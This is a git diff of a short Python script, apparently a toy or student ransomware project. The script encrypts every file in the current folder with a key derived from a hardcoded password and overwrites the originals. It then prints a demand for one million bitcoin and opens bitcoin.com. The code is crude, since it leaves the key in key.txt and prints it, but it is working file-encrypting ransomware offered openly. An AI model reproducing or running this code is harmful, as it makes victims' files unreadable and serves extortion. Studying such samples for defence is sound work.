@@ -1,43 +1,52 @@
 import os
-from cryptography.fernet import Fernet
 import webbrowser
+from utilities import generate_key, encrypt
 
 files = []
 
-# TODO: make this happen for every file in every directory?
-## add an if checking if it is a directory, if so, recursion
-## make this into a function instead so we can do so
-
 for file in os.listdir():
-    # avoid acciently locking out current progress, this can get annoying
+    # avoid locking ourselves out of programming
+    # WARNING: DO NOT REMOVE THESE
     if (
         file == "decrypt.py"
         or file == "encrypt.py"
+        or file == "utilities.py"
         or file == "key.txt"
         or file == "README.md"
+        or file == ".gitignore"
     ):
         continue
+    # only files not directories
+    # TODO: if we want to lock out ALL the files,
+    # maybe we can do a recursive function
+    # if os.path.isdir(file):
+    # recurse
     if os.path.isfile(file):
         files.append(file)
 
 print(files)
 
-key = Fernet.generate_key()
-print(key)
+# i am not sure why we need the password honestly
+password = b"no_hope123"
+salt = os.urandom(16)
+secret_key = generate_key(password, salt)
 
-# writing the key to a file for now
+# save password to a file for now
+# TODO: how can we save this somewhere more 'legit'?
 with open("key.txt", "wb") as key_file:
-    key_file.write(key)
+    key_file.write(salt + secret_key)
 
+# encrypt
 for file in files:
     with open(file, "rb") as _file:
         contents = _file.read()
 
-    enc_content = Fernet(key).encrypt(contents)
+    enc_content = encrypt(secret_key, contents)
+
+    # Write the e
     with open(file, "wb") as _file:
         _file.write(enc_content)
 
-
-# TODO: make this a function
+print("Give me one million bitcoin OR ELSE I WILL DELETE THE KEY FOREVER")
+print(secret_key)
 webbrowser.open("www.bitcoin.com")
-print("give me 1mil bitcoin OR ELSE!")
